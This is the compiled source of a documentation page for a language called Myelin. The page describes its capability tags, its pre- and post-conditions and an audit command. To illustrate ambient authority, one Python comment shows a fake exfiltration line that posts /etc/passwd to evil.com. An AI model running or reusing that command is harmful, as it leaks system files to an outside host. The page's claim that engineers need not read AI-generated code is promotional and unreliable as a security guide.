import{_ as a,o as t,c as i,a2 as e}from"./chunks/framework.vLhlLNVn.js";const k=JSON.parse('{"title":"Capabilities & Security Model","description":"","frontmatter":{},"headers":[],"relativePath":"guide/capabilities-security.md","filePath":"guide/capabilities-security.md","lastUpdated":null}'),n={name:"guide/capabilities-security.md"};function l(p,s,d,r,h,o){return t(),i("div",null,[...s[0]||(s[0]=[e(`<h1 id="capabilities-security-model" tabindex="-1">Capabilities &amp; Security Model <a class="header-anchor" href="#capabilities-security-model" aria-label="Permalink to &quot;Capabilities &amp; Security Model&quot;">​</a></h1><p>One of Myelin&#39;s core design pillars is <strong>Zero Ambient Authority</strong>. In traditional languages like Python, C#, or JavaScript, any function can secretly read your SSH keys, send network packets, or format your disk:</p><div class="language-python vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Unsafe in Python: does calculate_tax steal your files?</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> calculate_tax</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(income):</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # Could secretly do: requests.post(&quot;https://evil.com&quot;, data=open(&quot;/etc/passwd&quot;).read())</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> income </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 0.18</span></span></code></pre></div><p>In Myelin, <strong>pure functions are mathematically isolated</strong>. If a function does not declare a capability, the compiler and runtime physically prevent it from touching system resources.</p><hr><h2 id="the-capability-tags" tabindex="-1">The Capability Tags (<code>!</code>) <a class="header-anchor" href="#the-capability-tags" aria-label="Permalink to &quot;The Capability Tags (\`!\`)&quot;">​</a></h2><p>Capabilities are declared at the end of a function signature using <code>!</code> followed by a dotted identifier:</p><div class="language-myelin vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">myelin</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">#fn</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> send_invoice [email:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">str</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> amt:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">i64</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">] </span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">!net.http</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;"> !db.rw</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;"> !io</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  -- Can use HTTP, database, and standard I/O</span></span></code></pre></div><h3 id="standard-capability-hierarchy" tabindex="-1">Standard Capability Hierarchy <a class="header-anchor" href="#standard-capability-hierarchy" aria-label="Permalink to &quot;Standard Capability Hierarchy&quot;">​</a></h3><table tabindex="0"><thead><tr><th style="text-align:left;">Capability</th><th style="text-align:left;">Scope</th><th style="text-align:left;">Allowed Operations</th></tr></thead><tbody><tr><td style="text-align:left;"><code>!io</code></td><td style="text-align:left;">Standard Console I/O</td><td style="text-align:left;"><code>io.println</code>, printing debugging output</td></tr><tr><td style="text-align:left;"><code>!net</code></td><td style="text-align:left;">Network Operations</td><td style="text-align:left;">TCP, UDP, HTTP client/server (<code>http.serve</code>)</td></tr><tr><td style="text-align:left;"><code>!db</code></td><td style="text-align:left;">Persistent Storage</td><td style="text-align:left;">Read/write access to embedded database (<code>db.set</code>, <code>db.get</code>)</td></tr><tr><td style="text-align:left;"><code>!fs</code></td><td style="text-align:left;">File System</td><td style="text-align:left;">File reading and writing</td></tr><tr><td style="text-align:left;"><code>!clock</code></td><td style="text-align:left;">System Clock</td><td style="text-align:left;">Reading wall-clock time and timers</td></tr><tr><td style="text-align:left;"><code>!unsafe.mem</code></td><td style="text-align:left;">Raw Pointer Memory</td><td style="text-align:left;">Direct pointer dereferencing and C FFI calls</td></tr></tbody></table><hr><h2 id="design-by-contract-req-and-ens" tabindex="-1">Design-by-Contract (<code>req</code> and <code>ens</code>) <a class="header-anchor" href="#design-by-contract-req-and-ens" aria-label="Permalink to &quot;Design-by-Contract (\`req\` and \`ens\`)&quot;">​</a></h2><p>Myelin includes first-class contractual specifications:</p><ul><li><code>req &lt;Expr&gt;</code> (pre-condition): Must be true before the function body executes.</li><li><code>ens &lt;Expr&gt;</code> (post-condition): Must be true when the function returns (uses <code>ret</code> to refer to return value).</li></ul><div class="language-myelin vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">myelin</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">#fn</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> deposit [bal:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">i64</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> amt:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">i64</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -&gt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> i64</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  req</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> amt </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 0</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  ens</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ret </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> bal</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  new_bal </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> bal </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> amt</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> new_bal</span></span></code></pre></div><p>If contracts are violated at runtime, an assertion failure is triggered with source locations, immediately exposing faulty logic.</p><hr><h2 id="trust-capability-audit-myelinc-audit" tabindex="-1">Trust &amp; Capability Audit (<code>myelinc audit</code>) <a class="header-anchor" href="#trust-capability-audit-myelinc-audit" aria-label="Permalink to &quot;Trust &amp; Capability Audit (\`myelinc audit\`)&quot;">​</a></h2><p>When AI agents generate thousands of lines of software, human engineers do not need to read every single line of code. Instead, they run:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">myelinc</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> audit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> src/</span></span></code></pre></div><p>This outputs a cryptographic <strong>Trust Manifest</strong>:</p><div class="language-text vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">text</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>=== MYELIN TRUST &amp; CAPABILITY MANIFEST ===</span></span>
<span class="line"><span>Module: finance.settlement</span></span>
<span class="line"><span>Capabilities Claimed:</span></span>
<span class="line"><span>  - !db.rw       (Database Read/Write)</span></span>
<span class="line"><span>  - !net.https   (Outbound TLS Only)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Contracts Verified:</span></span>
<span class="line"><span>  - 12 functions with strict &#39;req&#39; &amp; &#39;ens&#39; proofs</span></span>
<span class="line"><span>  - Zero unsafe memory operations (!unsafe.mem is absent)</span></span>
<span class="line"><span>  - Zero ambient file access (!fs is absent)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Security Rating: HIGH TRUST (Verified pure computational pipeline)</span></span></code></pre></div>`,22)])])}const y=a(n,[["render",l]]);export{k as __pageData,y as default};
